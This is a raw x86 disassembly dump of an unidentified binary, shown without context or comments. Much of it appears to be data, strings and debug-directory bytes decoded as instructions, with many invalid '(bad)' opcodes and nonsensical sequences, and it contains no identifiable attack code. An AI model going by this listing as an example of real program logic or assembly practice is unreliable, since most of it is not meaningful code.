  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	jecxz  0x433989
  43395a:	enter  0x80a4,0x3a
  43395e:	lds    ecx,FWORD PTR [eax-0x5b]
  433961:	loopne 0x433970
  433963:	jecxz  0x43397e
  433965:	mov    al,0x91
  433967:	jg     0x433984
  433969:	add    BYTE PTR [eax],al
  43396b:	add    BYTE PTR [edx+edi*1+0x5c],dl
  43396f:	jns    0x4339da
  433971:	addr16 push edi
